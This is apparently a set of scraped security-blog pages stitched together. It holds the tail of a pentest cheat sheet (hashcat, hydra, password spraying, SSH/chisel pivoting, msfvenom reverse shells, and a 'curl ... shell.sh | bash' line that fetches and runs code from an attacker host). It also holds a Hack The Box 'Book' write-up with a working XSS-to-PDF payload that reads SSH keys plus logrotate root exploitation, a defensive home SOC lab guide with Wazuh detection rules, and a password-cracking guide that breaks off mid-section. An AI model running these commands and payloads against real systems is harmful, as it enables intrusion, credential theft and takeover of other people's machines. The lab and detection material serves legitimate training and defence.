hashcat -a 0 -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt         # kerberoast
hashcat -a 0 -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt        # as-rep

# rules (greatly expand coverage)
hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# hybrid — wordlist + mask (e.g. word + 4 digits)
hashcat -a 6 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt ?d?d?d?d

# john the ripper
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64
john --show hash.txt

# ssh private key passphrase
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# zip / keepass / office
zip2john archive.zip > zip.hash; john zip.hash
keepass2john keepass.kdbx > kp.hash; john kp.hash --wordlist=rockyou.txt online brute force # hydra — http post login
hydra -l $user -p /usr/share/wordlists/rockyou.txt $target http-post-form "/login:user=^user^&pass=^pass^:invalid credentials" -t 16

# ssh
hydra -l $user -p /usr/share/wordlists/rockyou.txt ssh://$target -t 4

# smb — use crackmapexec instead for spray
crackmapexec smb $target -u users.txt -p passwords.txt --continue-on-success

# password spray — same password, many users (avoids lockout)
crackmapexec smb $target -u users.txt -p 'season2024!' --continue-on-success pivoting & tunneling # ── ssh local forward (expose internal service to attacker) ────────────────
ssh -l $lport:$internal_ip:$internal_port $user@$target
# example: access 172.16.0.10:80 via localhost:8080
ssh -l 8080:172.16.0.10:80 user@$target

# ── ssh dynamic (socks5 proxy — route all traffic through host) ─────────────
ssh -d 1080 $user@$target
# then: proxychains nmap -st -pn 172.16.0.0/24
# /etc/proxychains4.conf: socks5 127.0.0.1 1080

# ── ssh remote forward (expose local port on pivot host) ────────────────────
ssh -r 4444:localhost:4444 $user@$target
# victim now connects back to target:4444 which forwards to attacker:4444

# ── chisel (great for restricted environments) ───────────────────────────────
# attacker:
./chisel server --port 8001 --reverse
# pivot host:
./chisel client $lhost:8001 r:socks           # reverse socks5 on attacker:1080
./chisel client $lhost:8001 r:8080:172.16.0.10:80  # specific port forward

# ── ligolo-ng (modern, tun interface — transparent) ─────────────────────────
# attacker:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
# pivot host:
./agent -connect $lhost:11601 -ignore-cert
# in ligolo console:
# session → select agent → start
# sudo ip route add 172.16.0.0/24 dev ligolo

# ── socat port relay ────────────────────────────────────────────────────────
socat tcp-listen:4444,fork tcp:172.16.0.10:4444 useful one-liners & misc # create a quick wordlist from a website
cewl -d 3 -m 5 http://$target -w wordlist.txt

# crack zip with fcrackzip
fcrackzip -u -d -p /usr/share/wordlists/rockyou.txt file.zip

# extract metadata from files
exiftool *

# decode various formats
echo "base64string" | base64 -d
echo "hex" | xxd -r -p
python3 -c "import urllib.parse; print(urllib.parse.unquote('url%20encoded'))"
python3 -c "import html; print(html.unescape('<b>'))"

# find world-writable files (common in web challenges)
find / -perm -o+w -type f 2>/dev/null | grep -v proc | grep -v sys

# diff two directories quickly
diff -rq /dir1 /dir2

# monitor file changes
inotifywait -m -r /etc/

# quick port check from victim (no netcat)
cat /dev/tcp/127.0.0.1/3306    # bash built-in, hangs = port open

# enumerate linux version
cat /etc/os-release
lsb_release -a

# grep for passwords recursively
grep -r "password\|passwd\|secret\|key\|token\|api_key" /var/www/ 2>/dev/null --include="*.php" --include="*.conf" --include="*.env"

# reverse shell via curl + bash (useful when only http allowed out)
curl http://$lhost:8000/shell.sh | bash

# msfvenom quick shells
msfvenom -p linux/x64/shell_reverse_tcp lhost=$lhost lport=4444 -f elf > shell.elf
msfvenom -p windows/x64/shell_reverse_tcp lhost=$lhost lport=4444 -f exe > shell.exe
msfvenom -p php/reverse_php lhost=$lhost lport=4444 -f raw > shell.php

# static binaries (for restricted machines)
# https://github.com/andrew-d/static-binaries
# ncat, socat, nmap, python — all statically linked external resources - **[gtfobins](https://gtfobins.github.io)** — suid, sudo, capabilities exploit guide for every binary
- **[lolbas](https://lolbas-project.github.io)** — living-off-the-land binaries for windows
- **[payloadsallthethings](https://github.com/swisskyrepo/payloadsallthethings)** — payloads for every attack type
- **[hacktricks](https://book.hacktricks.xyz)** — step-by-step for every service and technique
- **[revshells](https://www.revshells.com)** — reverse shell generator for every language
- **[crackstation](https://crackstation.net)** — online hash lookup
- **[hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)** — identify hash mode numbers
- **[seclists](https://github.com/danielmiessler/seclists)** — the wordlist collection: `/usr/share/seclists`
- **[exploddb / searchsploit](https://www.exploit-db.com)** — public exploit archive

title: HTB: Book
summary: SQL truncation for admin bypass, XSS-to-PDF local file read for SSH key theft, and logrotate exploitation for root.
body:
htb: book sql truncation for admin bypass, xss-to-pdf local file read for ssh key theft, and logrotate exploitation for root. writeups htb writeup linux medium lfi sqli reconnaissance nmap -sc -sv -oa nmap/book 10.10.10.176

port   state service version
22/tcp open  ssh     openssh 7.6p1 ubuntu 4ubuntu0.3
80/tcp open  http    apache httpd 2.4.29 two ports. ssh and a web server — nothing exotic. start with http. web enumeration the site is a php digital library — users can register, upload books (title + author + pdf), and browse a collection. there is a separate admin panel at `/admin/`.

key observations from source and `gobuster`:
- `/index.php` — user login/registration
- `/admin/` — admin panel (different session, separate login)
- registration enforces a **max length** on the name (20 chars) and email (20 chars) fields client-side gobuster dir -u http://10.10.10.176 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php

/index.php
/search.php
/books.php
/profile.php
/collections.php
/admin/ sql truncation — admin takeover the admin email `admin@book.htb` is referenced in the site footer. mysql silently truncates strings that exceed a column's `varchar` length — but the application's duplicate-check runs **before** the insert, using the full unsanitized string. this creates a bypass:

1. app checks: does `admin@book.htb[spaces]` exist? → **no**
2. mysql inserts and truncates trailing spaces → stores `admin@book.htb`
3. you now own the admin account with your chosen password # using burp or curl — send registration with email padded to 21 chars
# admin@book.htb = 14 chars, pad with 7 spaces (column is varchar(20)), add 1 overflow char

curl -s -x post http://10.10.10.176/index.php \
  --data-urlencode 'name=admin' \
  --data-urlencode 'email=admin@book.htb      a' \
  --data-urlencode 'password=hacked123'

# the 7 spaces + trailing char make the string 22 chars.
# app sees no collision, mysql truncates to admin@book.htb xss in pdf — local file read the admin panel has a **collections** feature that generates a pdf listing all submitted books (title + author). the pdf renderer is `dompdf` — it processes html, including `<script>` tags via an embedded js engine. user-submitted book titles are reflected into the pdf unsanitized.

the attack:
1. as a regular user, submit a book whose **title** or **author** field contains a js payload
2. log into the admin panel and download the collections pdf
3. the js fires inside the pdf renderer with local filesystem access # payload — inject as the book title field
# reads /etc/passwd first to confirm lfi, then target the ssh key

<script>
  x = new xmlhttprequest;
  x.onload = function() { document.write(this.responsetext); };
  x.open("get", "file:///home/reader/.ssh/id_rsa");
  x.send();
</script> # submit the book via the regular user session
curl -s -b cookies.txt -x post http://10.10.10.176/books.php \
  --data-urlencode 'bookname=<script>x=new xmlhttprequest;x.onload=function(){document.write(this.responsetext)};x.open("get","file:///home/reader/.ssh/id_rsa");x.send();</script>' \
  --data-urlencode 'bookauthor=test' \
  --data-urlencode 'bookgenre=test'

# then fetch the pdf from the admin panel
curl -b admin_cookies.txt http://10.10.10.176/admin/collections.php?type=user -o books.pdf

# extract the key from the pdf
pdftotext books.pdf -
# or open it in a browser — the key will be rendered as text in the pdf # copy the key from the pdf text, clean it up, save to id_rsa
-----begin rsa private key-----
miieowibaakcaqea2jjqscck6fe05owbvgoukzdf0fyicouf/vmgypfmnpfe
[... key truncated in writeup ...]
-----end rsa private key-----

chmod 600 id_rsa
ssh -i id_rsa reader@10.10.10.176 user flag reader@book:~$ cat user.txt
51c1d4b5197ef5ac04b048d31... [flag] privilege escalation — logrotate checking running processes with `pspy64` reveals a root-owned cron job executing `logrotate` against a log file the `reader` user controls: /root/log.cfg → rotates /home/reader/backups/access.log `logrotate` follows a `create` directive after rotation, creating the new log file as root. the [**logrotten**](https://github.com/whotwagner/logrotten) exploit races this `create` step to drop a payload into a `logrotate.d` config, achieving code execution as root. # download and compile logrotten on the box
cd /tmp
wget http://your_ip/logrotten.c
gcc -o logrotten logrotten.c

# payload — write your ssh key to root's authorized_keys
echo 'echo "ssh-rsa aaaa...your-pubkey" >> /root/.ssh/authorized_keys' > /tmp/payload

# trigger: write something to the log, then immediately run the exploit
echo test >> /home/reader/backups/access.log & \
  ./logrotten -p /tmp/payload /home/reader/backups/access.log

# wait for the cron to fire (up to ~60s), then:
ssh -i root_key root@10.10.10.176 the cron fires roughly every 5 seconds. run `pspy64` beforehand to confirm the exact interval and the logrotate config path (`/root/log.cfg`). root flag root@book:~# cat root.txt
e29a5be5e7b5f079df1dce40... [flag] key takeaways - **sql truncation** is a classic but still underrated bypass — always validate string length server-side with strict db column constraints.
- **server-side pdf generation** is a dangerous attack surface. any user input reflected into html-rendered pdfs should be treated as xss, not just a ui concern.
- **logrotate** running as root against user-writable paths is a common misconfiguration on older linux setups. always verify the ownership of files that privileged processes touch.

title: Building a Home SOC Lab — From Zero to Detection
summary: Build a fully functional Security Operations Centre lab at home. Covers hardware choices, network topology, SIEM deployment, log ingestion, endpoint agents, and
body:
building a home soc lab — from zero to detection build a fully functional security operations centre lab at home. covers hardware choices, network topology, siem deployment, log ingestion, endpoint agents, and running your first live attack simulation to validate detections. learn soc homelab blue-team siem wazuh elk detection dfir a home soc lab is the single best investment a security practitioner can make. every detection rule you write, every alert you tune, every incident response playbook you rehearse — all of it is done against live, misbehaving infrastructure before an adversary forces the lesson on you.

this guide takes you from bare hardware to a working detection stack that ingests logs, fires real alerts, and lets you run attack simulations against yourself. it is intentionally opinionated: there are a hundred ways to build a lab — this is the path that gets you detecting threats fastest. lab architecture overview the topology below separates concerns cleanly: a management vlan for your siem and admin traffic, a victim vlan where targets live, and an attacker vlan that is network-isolated from everything except the victim range. traffic between vlans is mirrored to a sensor so the siem sees everything. ┌─────────────────────────────────────────────────────────────────┐
│                        home network                             │
│  router / isp gateway (192.168.1.1)                             │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                   ┌───────┴────────┐
                   │  managed switch │  (vlan-capable, e.g. tp-link tl-sg108e)
                   └──┬──────┬──────┘
                      │      │      │
           ┌──────────┘      │      └──────────────┐
           │                 │                     │
    vlan 10: mgmt     vlan 20: victims      vlan 30: attacker
    10.0.10.0/24      10.0.20.0/24          10.0.30.0/24
           │                 │                     │
    ┌──────┴──────┐   ┌──────┴──────┐      ┌──────┴──────┐
    │  siem host  │   │ win10 vm    │      │  kali linux  │
    │  (wazuh +   │   │ win server  │      │  (attacker)  │
    │   elastic)  │   │ ubuntu vm   │      └─────────────┘
    │  10.0.10.10 │   │  (agents)   │
    └─────────────┘   └─────────────┘
           │
    ┌──────┴──────┐
    │  pfsense /  │  ← firewall between vlans + span port
    │  opnsense   │    to siem for full packet capture
    └─────────────┘ flat home networks let your attack traffic leak to your real devices. vlans enforce isolation — your kali box cannot accidentally pivot to your nas or printer. the attacker vlan is routed only to the victim vlan and has no internet access, forcing all c2 to stay in-lab. hardware recommendations you do not need a server rack. a single capable mini-pc can run the entire stack. the table below covers three budget tiers: an n100 mini-pc with 16 gb ram runs pfsense, wazuh manager, elasticsearch, one windows 10 victim, and kali simultaneously. upgrade ram before cpu — elasticsearch is memory-hungry. 32 gb is comfortable; 16 gb requires careful tuning of jvm heap sizes. hypervisor setup — proxmox ve # download proxmox ve iso from proxmox.com/en/downloads
# flash to usb: dd if=proxmox-ve_*.iso of=/dev/sdx bs=4m status=progress

# after install — disable enterprise repo, enable no-subscription repo
sed -i 's/^deb/#deb/' /etc/apt/sources.list.d/pve-enterprise.list
echo 'deb http://download.proxmox.com/debian/pve bookworm pve-no-subscription' \
  > /etc/apt/sources.list.d/pve-no-subscription.list
apt update && apt dist-upgrade -y

# create vlan-aware bridge (in proxmox ui: system > network)
# or via /etc/network/interfaces:
cat >> /etc/network/interfaces << 'eof'
auto vmbr0
iface vmbr0 inet static
    address 10.0.10.1/24
    bridge-ports eno1
    bridge-stp off
    bridge-fd 0
    bridge-vlan-aware yes
    bridge-vids 2-4094
eof

systemctl restart networking siem stack — wazuh + elastic wazuh is the best open-source siem for a home lab. it provides host-based intrusion detection (hids), log analysis, vulnerability detection, and active response. it ships with elasticsearch and kibana as the backend, giving you a full analysis dashboard. deploy wazuh (all-in-one) # on a fresh ubuntu 22.04 vm (minimum 4 vcpu, 8 gb ram, 50 gb disk)
# wazuh all-in-one installer (manager + indexer + dashboard)

curl -so https://packages.wazuh.com/4.7/wazuh-install.sh
curl -so https://packages.wazuh.com/4.7/config.yml

# edit config.yml — set your node's hostname/ip
vim config.yml
# nodes:
#   indexer:
#     - name: node-1
#       ip: 10.0.10.10
#   server:
#     - name: wazuh-1
#       ip: 10.0.10.10
#   dashboard:
#     - name: dashboard
#       ip: 10.0.10.10

bash wazuh-install.sh --generate-config-files
bash wazuh-install.sh --wazuh-indexer node-1
bash wazuh-install.sh --start-cluster
bash wazuh-install.sh --wazuh-server wazuh-1
bash wazuh-install.sh --wazuh-dashboard dashboard

# access dashboard at https://10.0.10.10
# default credentials printed at end of install — change them immediately
cat wazuh-passwords.txt deploy wazuh agents on victim machines # linux agent
curl -s https://packages.wazuh.com/key/gpg-key-wazuh | \
  gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import
chmod 644 /usr/share/keyrings/wazuh.gpg
echo 'deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main' \
  > /etc/apt/sources.list.d/wazuh.list
apt update && apt install wazuh-agent -y

# configure manager address
sed -i 's/manager_ip/10.0.10.10/' /var/ossec/etc/ossec.conf
systemctl start wazuh-agent
systemctl enable wazuh-agent

# windows agent (run in powershell as administrator)
invoke-webrequest -uri 'https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.0-1.msi' \
  -outfile 'wazuh-agent.msi'
start-process msiexec.exe -args '/i wazuh-agent.msi /quiet wazuh_manager=10.0.10.10' -wait
net start wazuhsvc essential log sources to ingest sysmon — most important windows sensor # download sysmon from microsoft sysinternals
invoke-webrequest -uri 'https://download.sysinternals.com/files/sysmon.zip' -outfile sysmon.zip
expand-archive sysmon.zip -destinationpath .\sysmon

# download swiftonsecurity config (excellent coverage, low noise)
invoke-webrequest -uri 'https://raw.githubusercontent.com/swiftonsecurity/sysmon-config/master/sysmonconfig-export.xml' `
  -outfile sysmonconfig.xml

# install
.\sysmon\sysmon64.exe -accepteula -i sysmonconfig.xml

# verify — check event viewer: applications and services logs > microsoft > windows > sysmon
get-winevent -logname 'microsoft-windows-sysmon/operational' -maxevents 5 | format-list

# wazuh agent — add sysmon to ossec.conf:
# <localfile>
#   <location>microsoft-windows-sysmon/operational</location>
#   <log_format>eventchannel</log_format>
# </localfile> running your first attack simulation a lab with no attacks is just expensive electricity. validate your detections immediately after setup. the workflow below runs a basic reconnaissance and lateral movement simulation from your kali vm against a windows victim, then verifies the siem caught it. # from kali (vlan 30) against windows victim (vlan 20: 10.0.20.10)

# 1. port scan — should trigger suricata + wazuh network anomaly alerts
nmap -ss -sv -p- 10.0.20.10

# 2. metasploit eternalblue (against unpatched windows — for lab use only)
msfconsole -q -x "
  use exploit/windows/smb/ms17_010_eternalblue;
  set rhosts 10.0.20.10;
  set payload windows/x64/meterpreter/reverse_tcp;
  set lhost 10.0.30.10;
  run"

# 3. from meterpreter — trigger high-value sysmon events
meterpreter > shell
# whoami /all
# net user
# net localgroup administrators
# ipconfig /all
# mimikatz (triggers credential access alerts)

# 4. check wazuh dashboard for:
#    - rule 18101: nmap scan detected
#    - rule 60122: shellcode or exploit attempt
#    - rule 92211: potential mimikatz credential dumping
#    - rule 61612: suspicious process chain (cmd.exe from svchost.exe) atomic red team — structured simulation # install invoke-atomicredteam on the windows victim
install-module -name invoke-atomicredteam -scope currentuser -force
install-atomicredteam -getatomics -force

# run specific att&ck technique tests
# t1059.001 — powershell execution
invoke-atomictest t1059.001

# t1003.001 — lsass credential dumping (mimikatz-style)
invoke-atomictest t1003.001

# t1547.001 — registry run key persistence
invoke-atomictest t1547.001

# t1055 — process injection
invoke-atomictest t1055

# run all tests for a technique and check siem after each
invoke-atomictest t1059.001 -showdetailsbrief  # see what each test does first tuning alerts — the real work raw wazuh generates thousands of alerts per day in a lab. alert fatigue kills detection effectiveness. the discipline of tuning is what separates a useful soc from an ignored dashboard.

**priority order for tuning:**
1. suppress high-volume, zero-signal alerts first (scheduled tasks, antivirus update checks)
2. raise severity on alerts that correlate with known attack patterns
3. create custom rules for your specific environment
4. build correlation rules: alert only when three related events fire within five minutes <!-- custom wazuh rule example: detect mimikatz via sysmon event id 10 (process access to lsass) -->
<!-- location: /var/ossec/etc/rules/local_rules.xml -->

<group name="windows,sysmon,credential_access">

  <rule id="100100" level="14">
    <if_group>sysmon</if_group>
    <field name="win.eventdata.targetimage" type="pcre2">(?i)lsass\.exe</field>
    <field name="win.system.eventid">^10$</field>
    <description>possible lsass memory dump — credential access attempt (sysmon eid 10)</description>
    <mitre>
      <id>t1003.001</id>
    </mitre>
  </rule>

  <rule id="100101" level="12">
    <if_group>sysmon</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)(mimikatz|sekurlsa|wce\.exe|pwdump)</field>
    <field name="win.system.eventid">^1$</field>
    <description>known credential dumping tool executed (sysmon eid 1)</description>
    <mitre>
      <id>t1003</id>
    </mitre>
  </rule>

</group> lab expansion path all attack simulations must run inside your lab vlans only. ensure your attacker vlan has no route to the internet and no route to your real home network. add firewall rules on pfsense to block egress from vlan 30 to everything except vlan 20. running offensive tools outside a controlled lab environment against systems you do not own is illegal.

title: Home Lab Notes — Mistakes I Made and What I Changed
summary: An honest post-mortem of my home lab build: the hypervisor choice I regretted, the SIEM I under-resourced into uselessness, the logging config that filled a dis
body:
home lab notes — mistakes i made and what i changed an honest post-mortem of my home lab build: the hypervisor choice i regretted, the siem i under-resourced into uselessness, the logging config that filled a disk in nine days, and the three changes that actually improved detection quality. notes home-lab siem soc lessons-learned every home lab writeup shows the finished diagram. this is the version with the mistakes left in, because the mistakes are where the actual lessons are. mistake 1: i picked the hypervisor for the wrong reason i started on vmware esxi because it's what i used at work and the ui was familiar. that familiarity cost me weeks later: the free tier i was running capped vcpu allocation per vm hard enough that my siem vm was starved the moment i added a second data source, and licensing changes mid-build meant i was migrating away from it anyway within four months.

i moved to **proxmox ve**, and the thing that actually mattered wasn't the ui — it was that zfs-backed storage with snapshots meant i could blow away a compromised victim vm and restore it to a clean state in under a minute, as many times a day as a lab actually needs. pick the hypervisor for the workflow you'll repeat constantly (rebuild-and-snapshot), not the one whose dashboard you already recognise. mistake 2: i under-resourced the siem, then blamed the siem i ran an elastic stack (elasticsearch + logstash + kibana) on a vm with 4gb of ram because that's what fit on the host i had. for weeks i thought elastic itself was the problem — queries timed out, ingestion lagged behind real-time by hours, dashboards took ten seconds to render a single panel. none of that was elastic's fault. it was mine, for treating a piece of software with a documented minimum heap size as something i could just squeeze into whatever was left over.

the fix wasn't a different product. it was admitting the siem is the centrepiece of a detection lab, not an afterthought, and resourcing it like one: 16gb ram minimum dedicated, on its own fast storage, before adding a single additional log source. once i did that, the *same* ingestion pipeline that previously choked handled triple the event volume without breaking a sweat. build and properly resource the siem *before* you add victim machines, attacker tooling, or anything else. a lab with five interesting targets and a siem that can't keep up teaches you nothing — you'll be debugging ingestion lag instead of writing detections. mistake 3: verbose logging filled a disk in nine days once the siem was properly resourced, i overcorrected: i enabled windows sysmon with a configuration that logged nearly everything — every process creation, every network connection, every file-create event, system-wide, across four windows targets, with no filtering. verbose logging felt like the responsible choice. it filled a 250gb log volume in **nine days**, and elasticsearch's index management quietly started deleting my oldest data to make room — silently, with no alert, because i hadn't configured one for that either.

the fix was a properly scoped sysmon config (the swiftonsecurity baseline, trimmed further for lab-specific noise: excluded my own management traffic, excluded routine windows update processes, kept everything related to process creation, network connections, and registry persistence keys). log volume dropped by roughly 80%, and — this was the counterintuitive part — **detection quality went up, not down**. a flood of low-value events was actually burying the handful of high-value ones in every search i ran. before (unfiltered sysmon, 4 windows targets):
  ~27 gb/day ingested -> 250 gb volume exhausted in 9 days

after (swiftonsecurity baseline + lab-specific exclusions):
  ~5 gb/day ingested -> same volume now holds ~50 days of retention the three changes that actually moved detection quality out of everything i tried, three changes had a measurable, repeatable effect on whether i actually caught simulated attacks — not just whether the lab looked complete.

**1. resourcing the siem properly before adding anything else.** already covered above, but it's the single highest-leverage change. a starved siem makes every other improvement invisible because you can't trust what it shows you.

**2. scoped logging over volume logging.** going from "log everything" to "log the things mapped to specific att&ck techniques i'm actually hunting for" cut noise dramatically and made every detection rule i wrote afterward easier to validate — fewer false positives to wade through meant i trusted my own alerts again.

**3. running a real attack simulation against the lab on a schedule, not just when i felt like it.** logs and dashboards that exist but never get tested against live attacker behaviour are decoration. scheduling a monthly atomic red team run against the lab and checking what fired (and, more importantly, what *didn't*) turned the lab from a museum piece into something that actually validated my detection coverage over time. i'd build in this order: hypervisor with fast snapshot/restore (proxmox + zfs) → fully-resourced siem, alone, validated with synthetic log volume before adding real sources → one windows and one linux victim with a scoped, baseline-derived logging config → attacker box → a recurring atomic red team or caldera schedule from week one, not month six. every mistake above came from doing one of those steps out of order.

title: Password Cracking — Hashcat, John, and the Full Methodology
summary: How password hashing works, identifying hash types, every attack mode in hashcat and john, wordlists, rules, mask attacks, cracking NTLM/NetNTLMv2/Kerberos/bcry
body:
password cracking — hashcat, john, and the full methodology how password hashing works, identifying hash types, every attack mode in hashcat and john, wordlists, rules, mask attacks, cracking ntlm/netntlmv2/kerberos/bcrypt, wordlist generation with cewl and cupp, and the cracking workflow for real engagements. tools hashcat john password-cracking ntlm kerberos wordlists red-team tools password cracking is one of the highest-return skills in offensive security. a single cracked hash can mean domain admin. a good wordlist plus the right ruleset will crack 60–80% of an average corporate password dump in under an hour.

this guide covers the theory of why hashing works the way it does, every attack mode you need to know in both hashcat and john the ripper, and the specific workflows for every hash type you'll encounter on a real engagement. how password hashing works a **hash function** is a one-way mathematical function: easy to compute forward, computationally infeasible to reverse. systems store the *hash* of a password rather than the password itself, so a database breach doesn't immediately expose credentials. plaintext → hash function → hash
"password1"  →  md5  →  8be8b5a97c862e4e09f6b4ce946e4cf3 you can't reverse this — but you don't have to. **cracking is guessing**: take a candidate plaintext, hash it with the same algorithm, compare the result to the target hash. if they match, you have the plaintext. candidate: "password1"
hash("password1") = 8be8b5a97c862e4e09f6b4ce946e4cf3
                  == target hash  ✓  cracked this is why cracking speed is measured in **hashes per second** — it's literally running the hash function millions or billions of times per second. what makes a hash "hard" to crack? **salting** adds a random value to the password before hashing: hash(salt + password) → stored as: salt:hash this defeats precomputed rainbow tables and means identical passwords produce different hashes. linux `/etc/shadow` uses salted hashes. windows ntlm does not. why ntlm is so dangerous windows stores ntlm hashes as `md4(utf-16le(password))` — no salt, no stretching. a modern gpu cracks ntlm at **~300 billion attempts/second**. an 8-character password with uppercase, lowercase, digits and symbols has a search space of ~645 trillion — cracked in under an hour with a decent gpu.

and ntlm hashes can be used **directly** for authentication via pass-the-hash — cracking isn't even required for lateral movement. the cracking pipeline candidate source  →  mutation rules  →  hash function  →  compare
(wordlist/mask)      (capitalize,         (md5/ntlm/        (match? print)
                      append nums)         sha1/bcrypt)       (no? next) identifying hash types before you can crack anything you need to know what algorithm produced the hash. visual identification tools for identification # hashid (precise, recommended)
hashid 'hash_here'
hashid -m 'hash_here'   # -m shows hashcat mode number

# hash-identifier (interactive)
hash-identifier

# haiti (modern, cargo install)
haitia 'hash_here'

# name-that-hash (excellent output)
name-that-hash -t 'hash_here'
pip3 install name-that-hash
nt -t '5f4dcc3b5aa765d61d8327deb882cf99' context-based identification don't just look at the hash — look at **where you got it**: wordlists your wordlist is the ceiling on your cracking success. a gpu without good candidates is worthless. essential wordlists # rockyou.txt — the baseline, 14 million passwords from 2009 breach
/usr/share/wordlists/rockyou.txt

# if gzipped:
gunzip /usr/share/wordlists/rockyou.txt.gz

# seclists — huge curated collection
git clone https://github.com/danielmiessler/seclists /opt/seclists

# best password lists in seclists:
/opt/seclists/passwords/leaked-databases/rockyou.txt
/opt/seclists/passwords/common-credentials/10-million-password-list-top-1000000.txt
/opt/seclists/passwords/darkweb2017-top10000.txt

# weakpass — tb-scale wordlist collection
# https://weakpass.com/wordlist
# best single file: weakpass_3a (~100gb combined, worth it for ntlm cracking)

# hashes.org recovered — real cracked passwords from previous campaigns
# https://hashes.com/en/download/found_my_hashes wordlist quality matters more than size a 14m rockyou list cracked with good rules will outperform a raw 1 billion wordlist with no rules. the key insight: real users follow predictable patterns — capitalise first letter, append a number 1–99, substitute @ for a, etc. rules encode these patterns. sorting and deduplication # sort and deduplicate (required before rules give full benefit)
sort -u wordlist.txt > wordlist_clean.txt

# check count
wc -l wordlist.txt

# remove blank lines
sed -i '/^$/d' wordlist.txt combining wordlists cat rockyou.txt custom.txt | sort -u > combined.txt generating custom wordlists generic wordlists miss organisation-specific passwords. custom wordlists built from target context dramatically improve crack rates. cewl — spider a website for keywords # basic: spider site, minimum 6 chars, depth 2
cewl http://target.com -m 6 -d 2 -w target_wordlist.txt

# include email addresses found on site
cewl http://target.com -m 6 --email -d 3 -w target_wordlist.txt

# authenticated crawl
cewl http://target.com -m 6 -a -u 'admin' -p 'password' -w wordlist.txt

# with offsite links
cewl http://target.com -m 6 --offsite -w wordlist.txt cewl extracts every unique word from the site — product names, team names, brand terms, technical jargon. these become the base candidates. cupp — common user passwords profiler builds a wordlist from personal information about a target: pip3 install cupp
cupp -i    # interactive — prompts for name, dob, partner, pet, etc.
cupp -w existing_wordlist.txt  # mutate an existing list
cupp -l    # download common passwords lists the output includes combinations like:
- `john1990`, `john1990`, `j0hn1990`
- `johnjane`, `john&jane`
- `fluffy2019!`, `fluffy2019@` mentalist (gui wordlist generator) for structured permutations without scripting: pip3 install mentalist
mentalist manual custom list for a target # grab company name, product names, domain
company="acme"
domain="acme"

# common corporate patterns
for word in $company $domain; do
  for suffix in 123 1234 2024 2025 '!' '@' '#' '123!' '2024!' '123@'; do
    echo "${word}${suffix}"
    echo "${word^}${suffix}"          # capitalised
    echo "${word^^}${suffix}"          # uppercase
    echo "${word:0:1}${word:1}${suffix}"  # first capital
  done
done > corp_wordlist.txt hashcat --stdout — generate mutations without cracking # apply rules to a wordlist and print results (don't crack — just generate)
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt > mutated.txt

# then use mutated.txt as input for another tool or inspection username wordlists (for password spraying) # namemash.py — generate username formats from first last
python3 namemash.py names.txt
# outputs: jsmith, smithj, john.smith, jsmith123, etc.

# or manual with common corporate patterns
awk '{print tolower($1"."$2)}' names.txt > user_dot.txt    # john.smith
awk '{print tolower(substr($1,1,1)$2)}' names.txt > users.txt  # jsmith hashcat — overview and setup hashcat is the industry-standard gpu-accelerated password recovery tool. it supports 300+ hash types and every major attack mode. gpu cracking is orders of magnitude faster than cpu for most algorithms. installation # kali / debian
apt install hashcat

# from source (latest, with gpu support)
git clone https://github.com/hashcat/hashcat
cd hashcat && make

# check gpu/cpu devices
hashcat -i basic syntax hashcat [options] hashfile [wordlist|mask|...]

key options:
  -m mode      hash type (see -h or https://hashcat.net/wiki/doku.php?id=hashcat)
  -a mode      attack mode (0=dict, 1=combo, 3=brute/mask, 6=hybrid-wl+mask, 7=hybrid-mask+wl)
  -o outfile   output cracked hashes to file
  -r rule      apply rule file
  --show       show already cracked hashes from potfile
  --force      ignore warnings (use in vms)
  --status     print status while running
  --runtime n  stop after n seconds
  -o           optimised kernel (faster, limited to max 32 char passwords)
  -w n         workload profile (1=low, 2=default, 3=high, 4=nightmare)
  --increment  with mask attacks: try all lengths up to the mask
  -p char      custom separator (default is :) potfile hashcat saves cracked hashes to `~/.local/share/hashcat/hashcat.potfile`. any hash in the potfile is considered already cracked — rerunning a cracked hash shows nothing unless you use `--show`: hashcat -m 1000 hashes.txt --show
# shows: hash:plaintext for already-cracked entries

# clear potfile (start fresh)
hashcat --potfile-disable -m 1000 ...     # disable for this run
rm ~/.local/share/hashcat/hashcat.potfile  # nuke it entirely running in a vm (cpu only) hashcat --force -d 1 -m 1000 hash.txt wordlist.txt
# -d 1 = use cpu only
# --force = ignore opencl warnings in vm hashcat attack modes attack mode 0 — dictionary the baseline: try every line in a wordlist. hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# with a rule file
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# stack multiple rules (applied sequentially)
hashcat -m 1000 hashes.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/toggles1.rule attack mode 1 — combinator combines two wordlists: every word from list1 is concatenated with every word from list2. hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# example: list1=[dog,cat] list2=[123,456]
# tries: dog123, dog456, cat123, cat456

# with rules applied to each side
hashcat -m 1000 -a 1 hashes.txt names.txt years.txt \
  -j '$!' \ # append ! to left word
  -k 'c'    # capitalise right word useful for patterns like `season2024`, `company2025!`, `nameyear`. attack mode 3 — brute force / mask mask attack: define a character set for each position in the password.

**built-in charsets:** ?l = lowercase  abcdefghijklmnopqrstuvwxyz
?u = uppercase  abcdefghijklmnopqrstuvwxyz
?d = digits     0123456789
?s = special    !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
?a = all        ?l?u?d?s
